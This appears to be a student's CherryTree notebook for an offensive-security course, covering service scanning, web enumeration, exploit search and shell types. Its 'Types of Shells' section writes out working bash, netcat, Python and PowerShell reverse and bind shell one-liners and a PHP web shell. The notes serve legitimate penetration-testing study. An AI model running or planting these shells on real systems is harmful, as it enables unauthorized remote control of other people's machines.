<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="Academy Notes" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677630067" ts_lastsave="1678138574">
    <node name="Pentesting Basics" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677646155" ts_lastsave="1677779696">
      <node name="Service Scanning" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677630161" ts_lastsave="1677646448">
        <rich_text>
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Nmap Scripts</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Go to scan:</rich_text>
        <rich_text>
		sudo nmap -sV -sC -p- 10.129.42.253

	</rich_text>
        <rich_text underline="single">Locate script by name</rich_text>
        <rich_text>:
		locate scripts/script-name

	</rich_text>
        <rich_text underline="single">Example:</rich_text>
        <rich_text>
		nmap --script smb-os-discovery.nse -p 445 10.10.10.10

</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">SMB</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Anonymous login</rich_text>
        <rich_text>:
		smbclient -N -L 10.10.10.10
		

	</rich_text>
        <rich_text underline="single">User login:</rich_text>
        <rich_text>
		smbclient -U bob \\\\10.10.10.10\\share
		
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">SNMP</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Default community strings (public / private):</rich_text>
        <rich_text>
		snmpwalk -v 2c -c public 10.129.42.254 1.3.6.1.2.1.1.5.0
	
		snmpwalk -v 2c -c private 10.129.42.253
	
	</rich_text>
        <rich_text underline="single">Bruteforce community string names:</rich_text>
        <rich_text>
		onesixtyone -c dict.txt 10.129.42.254</rich_text>
      </node>
      <node name="Web Enumeration" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677638570" ts_lastsave="1677646438">
        <rich_text>
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Directory / File Enumeration:</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">GoBuster:</rich_text>
        <rich_text>
		gobuster dir -u </rich_text>
        <rich_text link="webs http://10.10.10.121/">http://10.10.10.121/</rich_text>
        <rich_text> -w /usr/share/dirb/wordlists/common.txt
		
		gobuster dns -d host.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
		

</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Web Enumeration Tips:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text underline="single">Banner Grabbing / Web Server Headers:</rich_text>
        <rich_text>
			Web server headers provide a good picture of what is hosted on the web server. 
			
			</rich_text>
        <rich_text underline="single">Use curl to retreive server header information:</rich_text>
        <rich_text>
				curl -IL </rich_text>
        <rich_text link="webs https://www.target.com">https://www.target.com</rich_text>
        <rich_text>
				
				Date: Wed, 01 Mar 2023 04:13:20 GMT
				Server: Apache/2.4.29 (Ubuntu)
				Link: &lt;</rich_text>
        <rich_text link="webs https://www.inlanefreight.com/index.php/wp-json/">https://www.inlanefreight.com/index.php/wp-json/</rich_text>
        <rich_text>&gt;; rel="</rich_text>
        <rich_text link="webs https://api.w.org/">https://api.w.org/</rich_text>
        <rich_text>"
				Link: &lt;</rich_text>
        <rich_text link="webs https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7">https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7</rich_text>
        <rich_text>&gt;; rel="alternate"; type="application/json"
				Link: &lt;</rich_text>
        <rich_text link="webs https://www.inlanefreight.com/">https://www.inlanefreight.com/</rich_text>
        <rich_text>&gt;; rel=shortlink
				Content-Type: text/html; charset=UTF-8
	
	
		</rich_text>
        <rich_text underline="single">EyeWitness</rich_text>
        <rich_text> is another handly tool that can be used for web enumeration
		
	
		</rich_text>
        <rich_text underline="single">Whatweb:</rich_text>
        <rich_text>
			whatweb 10.10.10.121
			whatweb --no-errors 10.10.10.0/24
			
		
		</rich_text>
        <rich_text underline="single">SSL/TLS certificates:</rich_text>
        <rich_text>
			Browsing to </rich_text>
        <rich_text link="webs http://10.10.10.121">http://10.10.10.121</rich_text>
        <rich_text> and viewing the certificate reviels valuable information that can be used in a phishing attack.
			-&gt; Email address
			-&gt; Company name
			
		
		</rich_text>
        <rich_text underline="single">Robots.txt</rich_text>
        <rich_text>:
			robots.txt purpose is to instruct web crawlers which resources can and cannot be accessed for indexing.
			-&gt; can provide information such as locations and private files and admin pages.</rich_text>
      </node>
      <node name="Public Exploits" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677646134" ts_lastsave="1677646671">
        <rich_text>
</rich_text>
        <rich_text underline="single" style="italic" weight="heavy">Finding Public Exploits</rich_text>
        <rich_text>:

	</rich_text>
        <rich_text underline="single">install tools:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">sudo</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">apt</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">install</rich_text>
        <rich_text family="monospace"> exploitdb -y</rich_text>
        <rich_text>


	</rich_text>
        <rich_text underline="single">searchsploit:</rich_text>
        <rich_text>
		searchsploit openssh 7.2
		
		
	</rich_text>
        <rich_text underline="single">Online databases:</rich_text>
        <rich_text>
		Exploit DB  - </rich_text>
        <rich_text link="webs https://www.exploit-db.com/">https://www.exploit-db.com/</rich_text>
        <rich_text>
		Rapid7 DB -  </rich_text>
        <rich_text link="webs https://www.rapid7.com/db/">https://www.rapid7.com/db/</rich_text>
        <rich_text>
		Vulnerability Lab - </rich_text>
        <rich_text link="webs https://www.vulnerability-lab.com/">https://www.vulnerability-lab.com/</rich_text>
        <rich_text>
	
	
	</rich_text>
        <rich_text underline="single">Metasploit Primer:</rich_text>
        <rich_text>
		within msfconsole:
			msf6 &gt; search exploit eternalblue
			
			msf6 &gt; use exploit/windows/smb/ms17_010_psexec</rich_text>
      </node>
      <node name="Types of Shells" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1677656044" ts_lastsave="1677657345">
        <rich_text>
</rich_text>
        <rich_text underline="single" weight="heavy">Types of Shells:</rich_text>
        <rich_text>

	</rich_text>
        <rich_text underline="single">Reverse shell:</rich_text>
        <rich_text>
		Most common type of shell. Victim connects back to host machine.
		
	</rich_text>
        <rich_text underline="single">Bind shell:</rich_text>
        <rich_text>
		Opens a port on the victims computer.
	
	</rich_text>
        <rich_text underline="single">Web shell:</rich_text>
        <rich_text>
		Shell where the communication happens over a web server through http requests. 
		
	

	
</rich_text>
        <rich_text underline="single" weight="heavy">Reverse shell commands:</rich_text>
        <rich_text>

	Bash:
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">bash</rich_text>
        <rich_text family="monospace"> -c </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">rm</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">mkfifo</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">cat</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace">/bin/sh -i </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">2</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">&amp;1</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">nc</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">10.10</rich_text>
        <rich_text family="monospace">.10.10 </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">1234</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace">/tmp/f


</rich_text>
        <rich_text>	Powershell:
	</rich_text>
        <rich_text family="monospace">powershell </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NoP </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NonI </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">W Hidden </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Exec Bypass </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Command </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">New-Object</rich_text>
        <rich_text family="monospace"> System</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Net</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Sockets</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">TCPClient</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">"10.10.10.10"</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">1234</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">GetStream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[byte[]]</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace"> = 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">..</rich_text>
        <rich_text family="monospace">65535</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">%</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">{</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">};</rich_text>
        <rich_text family="monospace" foreground="#ff7676">while</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">((</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Read</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">))</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-ne</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">){;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">New-Object</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">TypeName System</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Text</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">ASCIIEncoding</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetString</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">iex</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> 2&gt;&amp;1 </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Out-String</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace">  = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">"PS "</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">pwd</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">Path </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">"&gt; "</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[text.encoding]</rich_text>
        <rich_text family="monospace">::ASCII</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetBytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Write</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Flush</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">()};</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Close</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">()</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>


</rich_text>
        <rich_text underline="single" weight="heavy">Bind shell commands:</rich_text>
        <rich_text>
	Bash:
		</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">rm</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">mkfifo</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">cat</rich_text>
        <rich_text family="monospace"> /tmp/f</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace">/bin/bash -i </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">2</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">&amp;1</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">|</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">nc</rich_text>
        <rich_text family="monospace"> -lvp </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">1234</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">&gt;</rich_text>
        <rich_text family="monospace">/tmp/f
</rich_text>
        <rich_text>
	Python:
		</rich_text>
        <rich_text family="monospace">python </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">c </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>
	Powershell:
		</rich_text>
        <rich_text family="monospace">powershell </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NoP </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">NonI </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">W Hidden </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Exec Bypass </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">Command </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$listener</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#ff4545">[System.Net.Sockets.TcpListener]</rich_text>
        <rich_text family="monospace">1234</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$listener</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">start</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$listener</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">AcceptTcpClient</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">GetStream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[byte[]]</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace"> = 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">..</rich_text>
        <rich_text family="monospace">65535</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">%</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">{</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">};</rich_text>
        <rich_text family="monospace" foreground="#ff7676">while</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">((</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Read</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">))</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-ne</rich_text>
        <rich_text family="monospace"> 0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">){;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">New-Object</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">-</rich_text>
        <rich_text family="monospace">TypeName System</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Text</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">ASCIIEncoding</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetString</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$bytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$i</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">iex</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$data</rich_text>
        <rich_text family="monospace"> 2&gt;&amp;1 </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">|</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Out-String</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">"PS "</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">pwd</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">Path </rich_text>
        <rich_text family="monospace" foreground="#5ab7ff">+</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#c4f465">" "</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">;</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace"> = </rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#ff4545">[text.encoding]</rich_text>
        <rich_text family="monospace">::ASCII</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">).</rich_text>
        <rich_text family="monospace">GetBytes</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendback2</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace" foreground="#ffb71a">Write</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace">0</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">,</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$sendbyte</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Length</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">);</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$stream</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Flush</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">()};</rich_text>
        <rich_text family="monospace" foreground="#c4f465">$client</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">.</rich_text>
        <rich_text family="monospace">Close</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">();</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>

	Unlike a reverse shell, if we drop our connection to the target machine, we can connect back immediately without having to exploit the target again.
	-&gt; However if the host reboots, or the shell stops for any reason, we will have to execute the exploit again.
	



</rich_text>
        <rich_text underline="single" weight="heavy">Upgrading TTY:</rich_text>
        <rich_text>

	To have the accessibility you would on a normal shell through your connection, like accessing previous commands or scrolling up and down. 
	-&gt; We need to upgrade our TTY.
	
	</rich_text>
        <rich_text underline="single">Upgrade with python:</rich_text>
        <rich_text>
	
		Target Machine:
			</rich_text>
        <rich_text family="monospace">python -c </rich_text>
        <rich_text family="monospace" foreground="#c4f465">'import pty; pty.spawn("/bin/bash")'</rich_text>
        <rich_text>
			
		Local Machine:	
			</rich_text>
        <rich_text family="monospace">rottaj@htb[/htb]</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">$</rich_text>
        <rich_text family="monospace"> stty raw -echo
			rottaj@htb[/htb]</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">$</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">fg</rich_text>
        <rich_text>

		</rich_text>
        <rich_text underline="single">(Use Cntl + Z to background the shell - once we hit </rich_text>
        <rich_text underline="single" weight="heavy">fg</rich_text>
        <rich_text underline="single"> it will bring us back to the target shell)</rich_text>
        <rich_text>



</rich_text>
        <rich_text underline="single" weight="heavy">Web Shells:</rich_text>
        <rich_text>
	
	A web shell is typically a web script, PHP or ASPX that executes commands through HTTP requests and prints output back to the web page.
	
	</rich_text>
        <rich_text underline="single">PHP:</rich_text>
        <rich_text>
		</rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">&lt;?php</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ffb71a">system</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">(</rich_text>
        <rich_text family="monospace">$_REQUEST</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">[</rich_text>
        <rich_text family="monospace" foreground="#c4f465">"cmd"</rich_text>
        <rich_text family="monospace" foreground="#9eb3ca">]);</rich_text>
        <rich_text family="monospace"> </rich_text>
        <rich_text family="monospace" foreground="#ff7676" weight="heavy">?&gt;</rich_text>
        <rich_text family="monospace">
</rich_text>
        <rich_text>

